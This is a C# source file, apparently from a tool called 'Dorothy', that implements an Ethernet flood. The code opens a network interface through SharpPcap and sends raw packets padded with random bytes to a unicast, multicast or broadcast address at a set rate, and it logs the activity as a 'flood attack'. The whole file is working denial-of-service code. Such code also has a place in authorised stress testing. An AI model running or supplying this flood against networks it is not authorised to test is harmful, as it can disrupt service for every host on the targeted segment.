using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using NLog;
using System.Diagnostics;

namespace Dorothy.Models
{
    public class EthernetFlood : IDisposable
    {
        private readonly PacketParameters _parameters;
        private readonly CancellationToken _cancellationToken;
        private readonly EthernetPacketType _packetType;
        private LibPcapLiveDevice? _device;
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private const int PacketSize = 1400; // Standard size for good throughput

        public enum EthernetPacketType
        {
            Unicast,
            Multicast,
            Broadcast
        }

        public EthernetFlood(PacketParameters parameters, EthernetPacketType packetType, CancellationToken cancellationToken)
        {
            _parameters = parameters;
            _packetType = packetType;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            try
            {
                var allDevices = CaptureDeviceList.Instance;
                _device = allDevices.OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Interface.Addresses
                        .Any(a => a.Addr?.ipAddress?.ToString() == _parameters.SourceIp.ToString()));

                if (_device == null)
                {
                    throw new Exception("No suitable network interface found");
                }

                _device.Open();
                Logger.Info($"Started Ethernet {_packetType} flood attack");

                var packetOverhead = 38; // Ethernet (14) + IPv4 (20) + UDP (8) headers
                var totalPacketSize = PacketSize + packetOverhead;
                var packetsPerSecond = _parameters.BytesPerSecond / totalPacketSize;
                var microsecondsPerPacket = 1_000_000.0 / packetsPerSecond;
                var sw = new System.Diagnostics.Stopwatch();

                await Task.Run(() =>
                {
                    sw.Start();
                    var nextPacketTime = 0L;
                    
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Wait until it's time to send the next packet
                            while (sw.ElapsedTicks < nextPacketTime)
                            {
                                if (_cancellationToken.IsCancellationRequested) return;
                                Thread.SpinWait(1);
                            }

                            var ethernetPacket = CreateEthernetPacket();
                            var ipPacket = CreateIPv4Packet();
                            ethernetPacket.PayloadPacket = ipPacket;

                            _device.SendPacket(ethernetPacket);
                            
                            // Calculate next packet time
                            nextPacketTime = sw.ElapsedTicks + (long)(microsecondsPerPacket * Stopwatch.Frequency / 1_000_000);
                        }
                        catch (Exception ex)
                        {
                            Logger.Error($"Error sending packet: {ex.Message}");
                            throw;
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error($"Ethernet flood attack failed: {ex.Message}");
                throw;
            }
        }

        private EthernetPacket CreateEthernetPacket()
        {
            PhysicalAddress destMac = _packetType switch
            {
                EthernetPacketType.Unicast => new PhysicalAddress(_parameters.DestinationMac),
                EthernetPacketType.Multicast => PhysicalAddress.Parse("01-00-5E-00-00-01"), // IPv4 multicast
                EthernetPacketType.Broadcast => PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                _ => throw new ArgumentException("Invalid Ethernet packet type")
            };

            return new EthernetPacket(
                new PhysicalAddress(_parameters.SourceMac),
                destMac,
                EthernetType.IPv4);
        }

        private IPv4Packet CreateIPv4Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv4Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                Protocol = ProtocolType.Raw,
                PayloadData = payload
            };
        }

        public void Dispose()
        {
            if (_device != null)
            {
                if (_device.Opened)
                {
                    _device.Close();
                }
                _device.Dispose();
                Logger.Info("Ethernet flood device closed and disposed");
            }
        }
    }
} 